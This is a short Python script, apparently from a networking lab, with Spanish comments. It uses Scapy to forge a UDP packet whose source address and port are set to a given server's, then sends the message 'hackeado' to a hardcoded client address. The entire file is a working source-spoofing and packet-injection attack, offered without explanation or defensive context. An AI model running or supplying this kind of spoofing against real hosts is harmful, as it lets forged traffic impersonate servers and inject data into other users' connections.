from scapy.all import *
import sys

conf.L3socket=L3RawSocket

if len(sys.argv) != 4:
    print('Use: '+sys.argv[0]+'port-client host port-server')
    sys.exit(1)
    
def get_local_ip(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('127.0.0.1', port))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

# Dirección IP y puertos del cliente y servidor
cliente_ip = "192.168.1.86"
print(cliente_ip)
cliente_puerto = int(sys.argv[1])
servidor_ip = str(sys.argv[2])
servidor_puerto = int(sys.argv[3])

resolved_ip = socket.gethostbyname(servidor_ip)
print(resolved_ip)

##ip = IP(dst= cliente_ip, src = servidor_ip)
ip = IP(dst= cliente_ip, src = resolved_ip)
udp = UDP (sport = servidor_puerto, dport = cliente_puerto)

# Crear un paquete UDP personalizado con el mensaje de inyección
mensaje = 'hackeado\n'.encode()
packet = ip/udp/mensaje 

send(packet)
# Enviar el paquete al servidor
